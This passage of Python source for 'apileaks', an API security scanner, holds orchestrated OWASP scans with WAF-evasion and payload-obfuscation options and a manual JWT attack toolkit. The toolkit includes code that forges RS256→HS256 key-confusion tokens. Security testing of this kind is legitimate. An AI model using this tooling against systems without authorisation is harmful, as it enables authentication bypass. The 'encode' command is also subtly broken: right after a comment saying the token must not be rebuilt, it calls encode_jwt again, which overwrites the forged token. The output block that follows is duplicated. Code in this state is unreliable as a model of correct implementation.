    #     scan aborts BEFORE any request is issued (Requirements 49.1, 49.4). Left
    #     as ``None`` when no Spec_Source is supplied so the existing no-spec path
    #     is preserved (Requirement 49.3). No-op when the options are absent.
    merged_spec_schema = None
    if opts.get('openapi') or opts.get('postman'):
        try:
            merged_spec_schema = asyncio.run(
                _load_spec_schema(opts.get('openapi') or (), opts.get('postman') or ()))
        except SpecImportError as exc:
            logger.error("Spec import failed", error=str(exc))
            click.echo(f"Error: {exc}", err=True)
            sys.exit(1)

    try:
        config_manager = ConfigurationManager()

        # --- 2. Config assembly: file OR in-memory (identical to full's path) ---
        if config_path:
            # Load run settings from the supplied Config_File (Requirements 10.1,
            # 10.5). A missing/malformed file raises and is surfaced below.
            cfg = config_manager.load_config(config_path)
        else:
            # Prepare user agent configuration
            user_agent_config = None
            if opts.get('user_agent_random'):
                user_agent_config = {'random': True}
            elif opts.get('user_agent_custom'):
                user_agent_config = {'custom': opts['user_agent_custom']}
            elif opts.get('user_agent_file'):
                user_agents = load_user_agents_from_file(opts['user_agent_file'])
                user_agent_config = {'file_list': user_agents}

            output_filename = prepare_output_filename(opts.get('output'))

            # Advanced discovery options are not part of the restructured option
            # surface (owasp subcommands / scan); default them off via opts.get so
            # the in-memory config matches the legacy full defaults when absent.
            advanced_config = {
                'detect_framework': opts.get('detect_framework', False) or opts.get('enable_advanced', False),
                'fuzz_versions': opts.get('fuzz_versions', False) or opts.get('enable_advanced', False),
                'framework_confidence': opts.get('framework_confidence', 0.6),
                'enable_payload_encoding': opts.get('enable_payload_encoding', False) or opts.get('enable_advanced', False),
                'enable_waf_evasion': opts.get('enable_waf_evasion', False) or opts.get('enable_advanced', False),
                'enable_subdomain_discovery': opts.get('enable_subdomain_discovery', False) or opts.get('enable_advanced', False),
                'enable_cors_analysis': opts.get('enable_cors_analysis', False) or opts.get('enable_advanced', False),
            }
            if opts.get('version_patterns'):
                advanced_config['version_patterns'] = [
                    p.strip() for p in opts['version_patterns'].split(',')
                ]

            status_code_filter = (
                parse_status_codes(opts['status_code']) if opts.get('status_code') else None
            )

            config_dict = create_enhanced_config(
                opts.get('target'), None, "full", user_agent_config, output_filename,
                advanced_config, status_code_filter, opts.get('ci_mode', False),
                opts.get('fail_on', 'high'), opts.get('safe_mode', False),
                module_configs=_collect_module_configs(descriptors, opts),
            )

            # Thread the discovery recursion / budget / concurrency / resilience
            # controls into the constructed config_dict PRE-load, reproducing the
            # legacy ``full`` in-memory assembly so the built config_dict (the
            # first consumer of the threaded settings) carries them (Requirements
            # 17, 18, 20, 23, 28). Post-load ``_apply_transversal_overrides``
            # re-applies the same values idempotently and additionally covers the
            # file-config path.
            config_dict['fuzzing']['max_depth'] = resolve_max_depth(opts.get('depth'))
            if opts.get('recursive') is not None:
                config_dict['fuzzing']['recursive'] = opts['recursive']
            if opts.get('max_requests') is not None:
                config_dict['fuzzing']['max_requests'] = opts['max_requests']
            if opts.get('concurrency') is not None:
                config_dict['fuzzing']['concurrency'] = opts['concurrency']
            if opts.get('timeout') is not None:
                config_dict['target']['timeout'] = opts['timeout']
            if opts.get('retries') is not None:
                config_dict['fuzzing']['retries'] = opts['retries']
            config_dict['fuzzing'].setdefault('endpoints', {})
            config_dict['fuzzing']['endpoints']['extensions'] = normalize_extensions(
                [ext for value in (opts.get('extensions') or ()) for ext in value.split(',')]
            )
            if opts.get('depth') == 0:
                config_dict['fuzzing']['recursive'] = False  # depth 0 => depth-0 pass only
            config_dict['fuzzing']['recursion_scope'] = opts.get('recursion_scope')

            cfg = config_manager.load_config_from_dict(config_dict)

        # --- 3. enabled_modules = the selection (Requirements 1.3, 4.2, 4.6) ---
        cfg.owasp_testing.enabled_modules = list(selected_keys)

        # --- 4. Transversal overrides (verbatim from full) — Reqs 3.5, 5.4 ---
        _apply_transversal_overrides(cfg, opts, parsed_auth_contexts)

        # --- 4b. Attach the parsed Actor_Profiles to the AuthContext whose name
        #     matches each profile's context_name (Requirements 54.1, 54.2).
        #     Applied post-load (after the transversal overrides extend the
        #     contexts) so it works for both file and in-memory configs. Contexts
        #     without a matching profile keep ``actor_profile = None`` (Req 54.3).
        if actor_profiles and hasattr(cfg, 'authentication'):
            for context in cfg.authentication.contexts:
                profile = actor_profiles.get(context.name)
                if profile is not None:
                    context.actor_profile = profile

        # --- 4c. Attach each context's compiled Unauthorized_Endpoint_Assertion
        #     patterns to the AuthContext whose name matches (Requirements 55.1,
        #     55.2). Contexts without a matching assertion keep
        #     ``unauthorized_patterns = None`` (Requirement 55.5).
        if unauthorized_endpoint_assertions and hasattr(cfg, 'authentication'):
            for context in cfg.authentication.contexts:
                patterns = unauthorized_endpoint_assertions.get(context.name)
                if patterns is not None:
                    context.unauthorized_patterns = patterns

        # --- 4d. Attach the merged Spec_Schema so the modules can test the
        #     declared Spec_Operations in addition to discovered endpoints
        #     (Requirements 49.2, 49.5). Left as ``None`` when no Spec_Source was
        #     supplied, preserving the existing behavior (Requirement 49.3).
        if merged_spec_schema is not None and hasattr(cfg, 'owasp_testing'):
            cfg.owasp_testing.spec_schema = merged_spec_schema

        # --- 5. Per-module specific-option application (Requirement 2.5) ---
        for desc in descriptors:
            if desc.apply_options:
                desc.apply_options(getattr(cfg.owasp_testing, desc.config_field), opts)

        # --- 6. Validate + dispatch to the UNCHANGED engine path ---
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            logger.error("Configuration validation failed", errors=validation_errors)
            for error in validation_errors:
                click.echo(f"Error: {error}", err=True)
            sys.exit(1)

        # --- 6b. Build scope_endpoints from spec when --openapi / --postman
        #     was supplied on an owasp subcommand (no wordlist discovery path).
        #     Convert each SpecOperation into a synthetic DiscoveryResult so the
        #     engine's scope-seeding path skips wordlist discovery entirely and
        #     feeds the SSRF (and other) modules exactly the spec-declared endpoints.
        scope_endpoints = None
        if merged_spec_schema is not None and merged_spec_schema.operations:
            from utils.discovery_session import DiscoveryResult
            base_url = cfg.target.base_url.rstrip("/")
            scope_endpoints = []
            for op in merged_spec_schema.operations:
                url = base_url + op.path
                scope_endpoints.append(
                    DiscoveryResult(
                        url=url,
                        method=op.method,
                        status_code=200,
                        endpoint_status="valid",
                    )
                )
            logger.info(
                "Seeding scan from spec",
                source="openapi/postman",
                endpoints=len(scope_endpoints),
            )
            click.echo(f"📋 Spec endpoints loaded: {len(scope_endpoints)} operations from OpenAPI/Postman")
            # When endpoints come from a spec, skip parameter fuzzing — it
            # generates thousands of wordlist probes against endpoints the
            # operator already knows about and drowns the OWASP module output.
            if hasattr(cfg, 'fuzzing') and hasattr(cfg.fuzzing, 'parameters'):
                cfg.fuzzing.parameters.enabled = False
                cfg.fuzzing.headers.enabled = False

        asyncio.run(run_enhanced_apileak(
            cfg,
            opts.get('ci_mode', False),
            opts.get('fail_on', 'high'),
            opts.get('baseline'),
            scope_endpoints=scope_endpoints,
        ))

    except (click.ClickException, SystemExit):
        # Preserve Click parameter errors and explicit exits (validation, gate)
        # so the process exit code is decided by the run, not this handler.
        raise
    except Exception as e:
        logger.error("Scan failed", error=str(e))
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


# ---------------------------------------------------------------------------
# Orchestrator helpers (design §5, §7): module-selection resolution and the
# deprecation notices for the ``full`` alias and hidden ``main`` command. These
# are CLI-surface only.
# ---------------------------------------------------------------------------

def _emit_deprecation_notice(deprecated, replacement):
    """Write a single Deprecation_Notice to standard error (design §7).

    The notice names the deprecated invocation and its replacement. It is
    written ONLY to stderr and never alters standard output or the exit code
    (Requirements 6.4, 6.7). Handlers call this exactly once per invocation.
    """
    click.echo(
        f"[DEPRECATION] '{deprecated}' is deprecated and will be removed in a "
        f"future release. Use '{replacement}' instead.",
        err=True,
    )


def _emit_module_selection_deprecation(modules):
    """Write the module-selection Deprecation_Notice for ``full --modules``.

    Maps a single selected key to its ``apileaks owasp <key>`` equivalent and a
    multi-key selection to ``apileaks scan --modules ...`` (Requirement 6.6).
    Written ONLY to stderr, exactly once, and never alters stdout or the exit
    code.
    """
    selected = [m.strip() for m in modules.split(',') if m.strip()]
    if len(selected) == 1:
        replacement = f"apileaks owasp {selected[0]}"
    else:
        replacement = f"apileaks scan --modules {','.join(selected)}"
    click.echo(
        f"[DEPRECATION] Selecting modules through 'full --modules' is "
        f"deprecated. Use '{replacement}' instead.",
        err=True,
    )


def _resolve_modules(modules):
    """Resolve the ``--modules`` selection to an ordered list of engine keys.

    Resolution follows the setting-resolution precedence command-line option ->
    Environment_Override -> built-in default (Requirements 10.3, 10.4):

    * a non-empty ``--modules`` option is used as given;
    * otherwise a non-empty ``APILEAK_MODULES`` Environment_Override is used;
    * otherwise the full registered set is returned in OWASP category order
      (Requirement 4.2).

    Every selected key (from either the option or the Environment_Override) is
    validated against the descriptor registry; an unregistered key aborts with a
    nonzero exit and a stderr message naming the offending key BEFORE any module
    runs (Requirements 4.7, 9.4).
    """
    if not modules:
        # Environment_Override: APILEAK_MODULES selects modules when --modules is
        # absent (Requirements 10.3, 10.4). An empty/unset value falls through to
        # the full default set (Requirement 4.2).
        env_modules = os.getenv('APILEAK_MODULES')
        if env_modules and env_modules.strip():
            modules = env_modules
        else:
            return all_keys()
    selected = [m.strip() for m in modules.split(',') if m.strip()]
    if not selected:
        return all_keys()
    for key in selected:
        try:
            get_descriptor(key)
        except KeyError:
            click.echo(
                f"Error: unregistered OWASP module '{key}'. "
                f"Registered modules: {', '.join(all_keys())}.",
                err=True,
            )
            sys.exit(1)
    return selected


def _selected_descriptors(modules):
    """Return the descriptors for the resolved ``--modules`` selection.

    Reuses :func:`_resolve_modules` so an unregistered key aborts before any run
    (Requirements 4.7, 9.4). The returned descriptors preserve the selection
    order.
    """
    return [get_descriptor(key) for key in _resolve_modules(modules)]


# ---------------------------------------------------------------------------
# Orchestrator_Command surface (design §5). ``scan`` is the primary name; the
# entire legacy ``full`` option surface is preserved on it (transversal, BOLA,
# and Auth options plus --config/--modules and the discovery/spec inputs) so
# historical invocations parse byte-for-byte unchanged. ``_orchestrator_options``
# declares that surface once so ``scan`` and the ``full`` alias are guaranteed
# identical (design §5's single intentional duplication).
# ---------------------------------------------------------------------------

# Options carried by the orchestrator beyond the shared Transversal_Options and
# the BOLA / Auth Module_Specific_Options: the config/module selection plus the
# discovery-enhancement and Spec_Source inputs the legacy ``full`` accepted.
_ORCHESTRATOR_EXTRA_OPTIONS = [
    click.option('--config', '-c', type=click.Path(exists=True),
                 help='Configuration file path (YAML or JSON) - optional'),
    click.option('--modules', help='Comma-separated list of OWASP modules to enable (default: all)'),
    click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)'),
    click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection (FastAPI, Express, Django, Flask, etc.)'),
    click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing (/v1, /v2, /api/v1, etc.)'),
    click.option('--framework-confidence', type=float, default=0.6, help='Minimum confidence threshold for framework detection (0.0-1.0)'),
    click.option('--version-patterns', help='Custom version patterns for fuzzing (comma-separated, e.g., /v1,/v2,/api/v1)'),
    click.option('--enable-advanced', is_flag=True, help='Enable all advanced features (framework detection, version fuzzing, subdomain discovery, CORS analysis)'),
    click.option('--enable-payload-encoding', is_flag=True, help='Enable advanced payload encoding and obfuscation techniques'),
    click.option('--enable-waf-evasion', is_flag=True, help='Enable WAF detection and evasion techniques'),
    click.option('--enable-subdomain-discovery', is_flag=True, help='Enable subdomain discovery and testing'),
    click.option('--enable-cors-analysis', is_flag=True, help='Enable CORS policy analysis and security headers testing'),
    click.option('--openapi', 'openapi', multiple=True, type=click.Path(),
                 help='OpenAPI/Swagger document (JSON or YAML) consumed by the OWASP modules '
                      'for spec-driven security testing. Repeatable; merged across all values.'),
    click.option('--postman', 'postman', multiple=True, type=click.Path(),
                 help='Postman collection (JSON) consumed by the OWASP modules for spec-driven '
                      'security testing. Repeatable; merged across all values.'),
    click.option('--actor-profile', 'actor_profile', type=click.Path(),
                 help='Actor_Profile source (JSON or YAML) supplying per-identity typed '
                      'query/body values keyed by context name and endpoint. Each profile is '
                      'attached to the matching --auth-context so multi-user tests use realistic '
                      'per-actor inputs. A parse failure aborts before any request is issued.'),
    click.option('--unauthorized-assertions', 'unauthorized_assertions', type=click.Path(),
                 help='Unauthorized_Endpoint_Assertion source (JSON or YAML) mapping each '
                      'context name to one or more endpoint pattern regular expressions that '
                      'SHOULD be forbidden for that identity. A parse/compile failure aborts '
                      'before any request is issued.'),
]


def _orchestrator_options(func):
    """Attach the complete orchestrator option surface to ``func``.

    Stacks (deepest first) the Auth and BOLA Module_Specific_Options, the shared
    Transversal_Options, and finally the orchestrator-only extras
    (``--config``/``--modules`` and the discovery/spec inputs), so the resulting
    help lists the extras first, then the transversal options, then BOLA, then
    Auth — matching the legacy ``full`` layout. Declaring the surface once here
    guarantees ``scan`` and the ``full`` alias are identical (design §5).
    """
    func = auth_options(func)
    func = bola_options(func)
    func = transversal_options(func)
    for option in reversed(_ORCHESTRATOR_EXTRA_OPTIONS):
        func = option(func)
    return func


@cli.command(name='scan')
@_orchestrator_options
@click.pass_context
def scan(ctx, **kwargs):
    """Run an orchestrated OWASP scan (discovery + selected OWASP modules).

    \b
    Runs every registered OWASP module by default, or only the modules named in
    --modules. Aggregates all findings through the unified reporting pipeline and
    drives the CI/CD severity gate.

    \b
    Examples:
      apileaks scan --target https://api.example.com
      apileaks scan --config config.yaml --target URL
      apileaks scan --target URL --modules bola,auth,property
      apileaks scan --target URL --ci-mode --fail-on high
    """
    config_path = kwargs.get('config')
    modules = kwargs.get('modules')
    _build_and_run(
        ctx,
        selected_keys=_resolve_modules(modules),
        descriptors=_selected_descriptors(modules),
        opts=kwargs,
        config_path=config_path,
    )


@cli.command(name='full', hidden=True)
@_orchestrator_options
@click.pass_context
def full(ctx, **kwargs):
    """[DEPRECATED] Alias of 'scan'. Use 'apileaks scan' instead.

    Retained for backward compatibility. Emits a deprecation notice to standard
    error and then runs identically to 'scan' (same modules, report, and exit
    code).
    """
    _emit_deprecation_notice('full', 'scan')
    if kwargs.get('modules'):
        _emit_module_selection_deprecation(kwargs['modules'])
    # Forward the identical parsed option surface to ``scan`` so the run and exit
    # code are identical; the only difference is the stderr notice above
    # (Requirements 6.1, 6.2, 6.7).
    ctx.forward(scan)


# ---------------------------------------------------------------------------
# owasp command group + dynamically generated Module_Subcommands (design §4).
#
# One first-class subcommand is generated per OWASP_MODULE_DESCRIPTORS entry,
# named character-for-character by the engine registration key. Each subcommand
# stacks the shared Transversal_Options (Shared_Option_Mechanism), the
# descriptor's own Module_Specific_Options (only when it owns any), and routes
# into the shared _build_and_run execution core with selected_keys=[desc.key]
# so exactly that one module runs.
#
# Unknown subcommand names and foreign specific options are rejected natively by
# Click (nonzero exit) — no extra code (Requirements 1.6, 2.7, 8.5). dir/par are
# never registered here (Requirement 8.5).
#
# Requirements: 1.1, 1.2, 1.3, 1.4, 1.6, 7.4, 7.5, 11.1, 11.3, 11.4
# ---------------------------------------------------------------------------

def _module_help(desc: OwaspModuleDescriptor) -> str:
    """Build the ``--help`` description text for a module subcommand.

    The base text names the OWASP category and the module summary and states
    that the subcommand runs exactly that one module in isolation.

    For the ``auth`` descriptor specifically, the help additionally states that
    automated JWT detection during an orchestrated run is performed by the
    JWT_Module_Tests, and points to the ``jwt`` group as the location for manual
    JWT attacks (Requirements 7.4, 7.5).

    Args:
        desc: The descriptor whose subcommand help text is being built.

    Returns:
        The multi-paragraph help string for the subcommand.
    """
    base = (
        f"[{desc.owasp_category}] {desc.summary}.\n\n"
        f"Runs only the '{desc.key}' OWASP module against the target "
        f"(single-module run in isolation)."
    )

    if desc.key == "auth":
        base += (
            "\n\n"
            "Automated JWT detection during an orchestrated run is performed by "
            "the JWT_Module_Tests (the algorithm-confusion and expired-token "
            "acceptance checks governed by --public-key, --jwks-url, and "
            "--signing-secret).\n\n"
            "For manual JWT attacks and utilities, use the 'jwt' command group "
            "(e.g. 'apileaks jwt --help')."
        )

    return base


def _print_owasp_module_listing() -> None:
    """Write one line per descriptor to stdout (Requirements 1.4, 11.4).

    Each line contains the module's engine registration key, its OWASP category
    identifier, and its single-line (<= 80 char) summary, in OWASP category
    order (API1..API10).
    """
    for desc in OWASP_MODULE_DESCRIPTORS:
        click.echo(f"{desc.key}\t{desc.owasp_category}\t{desc.summary}")


@cli.group(invoke_without_command=True)
@click.pass_context
def owasp(ctx):
    """OWASP API Security Top 10 testing modules (run one module in isolation).

    Each subcommand runs exactly one registered OWASP detection module against a
    target. Run 'apileaks owasp' with no subcommand to list every available
    module with its OWASP category and a one-line description.
    """
    if ctx.invoked_subcommand is None:
        _print_owasp_module_listing()
        ctx.exit(0)


def _make_module_subcommand(desc: OwaspModuleDescriptor):
    """Build the fully decorated ``owasp`` subcommand for ``desc`` (design §4).

    Stacks the decorators in this order (applied in reverse so Click composes
    them correctly):

    1. ``click.command(name=desc.key, help=_module_help(desc))`` — the command
       named character-for-character by the engine key.
    2. ``transversal_options`` — the Shared_Option_Mechanism.
    3. ``desc.specific_options`` — the module's own options (only when not None).
    4. ``click.pass_context`` — so the handler receives the Click context.

    The handler routes into the shared execution core with a single selected
    key, so exactly that one module runs (Requirement 1.3).

    Args:
        desc: The descriptor to generate a subcommand for.

    Returns:
        The fully decorated Click command.
    """
    decorators = [
        click.command(name=desc.key, help=_module_help(desc)),
        transversal_options,
    ]
    if desc.specific_options is not None:
        decorators.append(desc.specific_options)
    decorators.append(click.pass_context)

    def _handler(ctx, **kwargs):
        _build_and_run(
            ctx, selected_keys=[desc.key], descriptors=[desc], opts=kwargs)

    cmd = _handler
    for dec in reversed(decorators):
        cmd = dec(cmd)
    return cmd


# Register exactly one generated subcommand per descriptor on the owasp group,
# then the owasp group on cli. Adding a descriptor row yields a fully wired
# subcommand automatically (Requirements 1.2, 11.1).
for _desc in OWASP_MODULE_DESCRIPTORS:
    owasp.add_command(_make_module_subcommand(_desc))


# ---------------------------------------------------------------------------
# JWT CLI helpers — route all attack-token generation and execution through the
# single-source-of-truth JWTAttackEngine (Requirements 14.2, 14.3) and issue
# HTTP through the shared HTTPRequestEngine (Requirement 17.1). No subcommand
# reimplements attack logic inline, and success is decided by the engine's
# JWTAttackResponseAnalyzer rather than admin/dashboard keyword presence
# (Requirement 19.2).
# ---------------------------------------------------------------------------

def _parse_custom_headers(header):
    """Parse repeatable ``Name: Value`` header options into a dict.

    Exits with an error on a malformed header, matching prior CLI behavior.
    """
    custom_headers = {}
    for h in header:
        if ':' not in h:
            click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
            sys.exit(1)
        name, value = h.split(':', 1)
        custom_headers[name.strip()] = value.strip()
    return custom_headers


def _build_jwt_http_engine(timeout=30, verify_ssl=True):
    """Build a shared :class:`HTTPRequestEngine` for JWT attack requests.

    Routing JWT HTTP through the shared engine applies the same rate limiting,
    proxy, User-Agent rotation, and TLS controls as the rest of the tool
    (Requirement 17.1).
    """
    from core.config import RateLimitConfig
    from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig

    rate_limiter = RateLimiter(RateLimitConfig())
    retry_config = RetryConfig(max_attempts=3)
    return HTTPRequestEngine(
        rate_limiter, retry_config, timeout=timeout, verify_ssl=verify_ssl)


def _make_jwt_engine(token, url, custom_headers, data, http_engine=None,
                     signing_secret=None, fuzz_target=None, fuzz_values=None,
                     canary_value=None, public_key_material=None):
    """Construct a :class:`JWTAttackEngine` for a CLI subcommand.

    ``fuzz_target``/``fuzz_values`` drive the CLAIM_FUZZING vector (Req 63.1) and
    ``canary_value`` corroborates — but never replaces — analyzer-based success
    (Reqs 67.3-67.5). ``public_key_material`` supplies the target's asymmetric
    public key (PEM/DER path or inline PEM) used by the ALGORITHM_CONFUSION
    vector. All default to ``None`` so the single-token path is preserved
    unchanged when no new option is supplied (Req 67.5).
    """
    return JWTAttackEngine(
        target_url=url or "",
        original_token=token,
        http_engine=http_engine,
        signing_secret=signing_secret,
        public_key_material=public_key_material,
        custom_headers=custom_headers or {},
        post_data=data,
        fuzz_target=fuzz_target,
        fuzz_values=fuzz_values,
        canary_value=canary_value,
    )


def _display_generated_tokens(engine, attack_type):
    """Generate and print attack tokens for ``attack_type`` via the engine."""
    tokens = engine.generate_token(attack_type)
    click.echo(f"\n🎯 Generated {len(tokens)} attack token(s) via JWTAttackEngine:")
    click.echo("-" * 55)
    for i, tok in enumerate(tokens, 1):
        click.echo(f"\n{i}. {tok}")
    return tokens


def _report_attack_result(result):
    """Report a single :class:`AttackResult` using the analyzer's assessment.

    Success is determined by the engine's :class:`JWTAttackResponseAnalyzer`
    (baseline comparison + confidence scoring), never by keyword presence
    (Requirements 19.1, 19.2).
    """
    if result is None:
        click.echo("   ⚠️  No response obtained from the endpoint for this vector")
        return False

    assessment = result.vulnerability_assessment
    response = result.response_details
    click.echo(f"\n🧪 {result.attack_type.value}:")
    click.echo(f"   Status: {response.status_code}")
    click.echo(f"   Length: {response.content_length} bytes")
    click.echo(f"   Confidence: {assessment.confidence_score:.2f}")
    if result.baseline_comparison:
        bc = result.baseline_comparison
        click.echo(
            f"   Baseline: {bc.get('baseline_status')} -> {bc.get('attack_status')} "
            f"(len Δ {bc.get('content_length_diff')})")

    if assessment.is_vulnerable:
        click.echo(f"   🚨 VULNERABILITY CONFIRMED: {assessment.vulnerability_type} "
                   f"({assessment.severity.value})")
        for ev in assessment.evidence:
            click.echo(f"   💀 {ev}")
        return True

    click.echo("   ✅ Attack blocked - server rejected the malicious token")
    return False


def _run_jwt_vector(token, attack_type, url, custom_headers, data, timeout,
                    verify_ssl=True, signing_secret=None, public_key_material=None):
    """Drive one JWT attack vector through the engine.

    When ``url`` is provided the vector is executed against the endpoint through
    the shared :class:`HTTPRequestEngine` and evaluated by the engine's response
    analyzer; otherwise the generated tokens are displayed for manual testing.
    """
    if not url:
        engine = _make_jwt_engine(token, url, custom_headers, data,
                                  public_key_material=public_key_material)
        _display_generated_tokens(engine, attack_type)
        click.echo("\n⚠️  Manual Testing Required (no --url provided):")
        click.echo("• Test each generated token against your API endpoints")
        click.echo("• If a token is accepted, the server is vulnerable to this attack")
        return

    async def _run():
        http_engine = _build_jwt_http_engine(timeout, verify_ssl)
        try:
            engine = _make_jwt_engine(
                token, url, custom_headers, data,
                http_engine=http_engine, signing_secret=signing_secret,
                public_key_material=public_key_material)
            _display_generated_tokens(engine, attack_type)
            click.echo(f"\n🎯 Testing against endpoint: {url}")
            result = await engine.execute_attack(attack_type)
            _report_attack_result(result)
        finally:
            await http_engine.close()

    asyncio.run(_run())


# JWT Command Group
@cli.group()
@click.pass_context
def jwt(ctx):
    """Manual JWT attack and utility toolkit - decode, encode, and security testing

    \b
    This is the manual JWT toolkit: an operator-driven set of utilities and
    attack primitives you run by hand. It is distinct from the automated
    JWT_Module_Tests performed during an orchestrated OWASP run (see the
    'owasp auth' subcommand).

    \b
    JWT Security Testing includes:
    • Token decoding and analysis
    • Custom token generation
    • Algorithm confusion attacks (alg:none, null signature)
    • Weak HMAC secret brute-force
    • Key ID (kid) injection attacks
    • JWKS spoofing and inline injection
    • Comprehensive attack testing against live endpoints
    • Blank password signature acceptance
    • Login to an auth endpoint and capture the returned JWT

    \b
    Basic Examples:
      python apileaks.py jwt decode TOKEN
      python apileaks.py jwt encode '{"sub":"user"}' --secret key
      python apileaks.py jwt test-alg-none TOKEN
      python apileaks.py jwt brute-secret TOKEN --wordlist secrets.txt

    \b
    Fetch a token from a login endpoint:
      python apileaks.py jwt login --url http://HOST/api/v1/login \\
          --body '{"username":"user","password":"pass"}'
      python apileaks.py jwt login --url http://HOST/api/v1/login \\
          --body '{"username":"user","password":"pass"}' --save token.jwt

    \b
    Use 'python apileaks.py jwt COMMAND --help' for detailed help on any command.
    """
    pass


@jwt.command('decode')
@click.argument('token')
@click.pass_context
def jwt_decode_cmd(ctx, token):
    """Decode and analyze a JWT token

    \b
    Example:
      python apileaks.py jwt decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
    """
    try:
        decoded = decode_jwt(token)
        print_jwt_info(decoded)

        # Also output as JSON for programmatic use
        click.echo("\n📄 JSON Output:")
        click.echo("-" * 20)
        click.echo(json.dumps({
            'header': decoded['header'],
            'payload': decoded['payload'],
            'signature': decoded['signature']
        }, indent=2))

    except ValueError as e:
        click.echo(f"❌ Error decoding JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('encode')
@click.argument('payload')
@click.option('--header', default='{"alg":"HS256","typ":"JWT"}', help='JWT header as JSON string')
@click.option('--secret', default='secret', help='Secret key for signing (default: "secret")')
@click.option('--public-key', 'public_key_file', type=click.Path(),
              help='PEM public key file to use as HMAC secret (RS256→HS256 key confusion attack). '
                   'When provided, --secret is ignored and the raw DER bytes of the key are used.')
@click.pass_context
def jwt_encode_cmd(ctx, payload, header, secret, public_key_file):
    """Encode a JWT token with custom payload and header

    \b
    Examples:
      python apileaks.py jwt encode '{"sub":"user123","role":"user"}'
      python apileaks.py jwt encode '{"sub":"admin"}' --secret mysecret
      python apileaks.py jwt encode '{"sub":"admin","admin":1}' \\
          --header '{"alg":"HS256","typ":"JWT"}' \\
          --public-key public.pem
    """
    try:
        # Parse JSON strings
        try:
            header_dict = json.loads(header)
        except json.JSONDecodeError:
            click.echo("❌ Error: Header must be valid JSON", err=True)
            sys.exit(1)

        try:
            payload_dict = json.loads(payload)
        except json.JSONDecodeError:
            click.echo("❌ Error: Payload must be valid JSON", err=True)
            sys.exit(1)

        is_none_alg = header_dict.get('alg', '').lower() == 'none'

        # --public-key: key confusion attack — sign with raw DER bytes of the
        # public key as the HMAC secret, exactly as vulnerable libraries do.
        if public_key_file:
            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives.serialization import (
                Encoding,
                PublicFormat,
                load_pem_public_key,
            )
            try:
                pem_data = Path(public_key_file).read_bytes()
                pub_key = load_pem_public_key(pem_data, backend=default_backend())
                # DER-encode the public key (SubjectPublicKeyInfo / PKCS#8 format)
                der_bytes = pub_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
            except Exception as exc:
                click.echo(f"❌ Could not load public key from {public_key_file}: {exc}", err=True)
                sys.exit(1)

            # Build token manually using raw DER bytes as HMAC key
            import base64 as _b64
            import hashlib as _hashlib
            import hmac as _hmac
            def _b64url(data: bytes) -> str:
                return _b64.urlsafe_b64encode(data).rstrip(b'=').decode()

            h_enc = _b64url(json.dumps(header_dict, separators=(',', ':')).encode())
            p_enc = _b64url(json.dumps(payload_dict, separators=(',', ':')).encode())
            msg = f"{h_enc}.{p_enc}".encode()
            sig = _hmac.new(der_bytes, msg, _hashlib.sha256).digest()
            token = f"{h_enc}.{p_enc}.{_b64url(sig)}"
            secret_label = f"<DER bytes of {public_key_file}>"
        else:
            token = encode_jwt(header_dict, payload_dict, secret)
            secret_label = secret

        # NOTE: token is already built above (either via DER-key path or encode_jwt).
        # Do NOT call encode_jwt again here — that would overwrite the DER-signed
        # key-confusion token with a plain HMAC-secret token (BUG-002 fix).

        # Encode JWT
        token = encode_jwt(header_dict, payload_dict, secret)

        click.echo("\n" + "="*60)
        click.echo("JWT Token Generated")
        click.echo("="*60)

        # Determine alg once; is_none_alg was already set before the if/else above.
        if is_none_alg:
            click.echo(click.style("\n⚠️  alg:none — no signature generated (trailing dot only)", fg='yellow'))
        elif public_key_file:
            click.echo(click.style(f"\n🔑 Key confusion: signed with DER bytes of {public_key_file}", fg='yellow'))
        else:
            click.echo(f"\n🔑 Secret Used: {secret_label}")
        is_none_alg = header_dict.get('alg', '').lower() == 'none'
        if is_none_alg:
            click.echo(click.style("\n⚠️  alg:none — no signature generated (trailing dot only)", fg='yellow'))
        elif public_key_file:
            click.echo(click.style(f"\n🔑 Key confusion: signed with DER bytes of {public_key_file}", fg='yellow'))
        else:
            click.echo(f"\n🔑 Secret Used: {secret_label}")

        click.echo("📋 Header: " + click.style(json.dumps(header_dict), fg=JWT_HEADER_COLOR))
        click.echo("🔐 Payload: " + click.style(json.dumps(payload_dict), fg=JWT_PAYLOAD_COLOR))
        click.echo("\n🎫 Generated Token:")
        click.echo("-" * 20)
        if is_none_alg:
            # colorize_jwt would fail on an empty/absent signature — print raw token.
            click.echo(token)
            click.echo("  " + click.style("■ header", fg=JWT_HEADER_COLOR, bold=True)
                       + "  " + click.style("■ payload", fg=JWT_PAYLOAD_COLOR, bold=True)
                       + "  " + click.style("■ (no signature)", fg=JWT_SIGNATURE_COLOR, bold=True))
        else:
            click.echo(colorize_jwt(decode_jwt(token)))
            click.echo("  " + click.style("■ header", fg=JWT_HEADER_COLOR, bold=True)
                       + "  " + click.style("■ payload", fg=JWT_PAYLOAD_COLOR, bold=True)
                       + "  " + click.style("■ signature", fg=JWT_SIGNATURE_COLOR, bold=True))
        click.echo("\n" + "="*60)

    except ValueError as e:
        click.echo(f"❌ Error encoding JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('verify')
@click.argument('token')
@click.option('--secret', help='Shared secret for HMAC (HS*) verification')
@click.option('--key-file', type=click.Path(), help='Path to a PEM/DER public key or certificate file')
@click.option('--pem', help='Inline PEM public key or certificate material')
@click.option('--jwks', 'jwks_file', type=click.Path(),
              help='Path to a JWKS file (single JWK entry or {"keys": [...]})')
@click.pass_context
def jwt_verify_cmd(ctx, token, secret, key_file, pem, jwks_file):
    """Verify a JWT signature against supplied key material (network-free)

    Dispatches on the token header algorithm: HS* uses the shared --secret,
    while RS*/PS*/ES* use the public key from --key-file, --pem, or --jwks.
    No HTTP request is issued (Requirement 65.3).

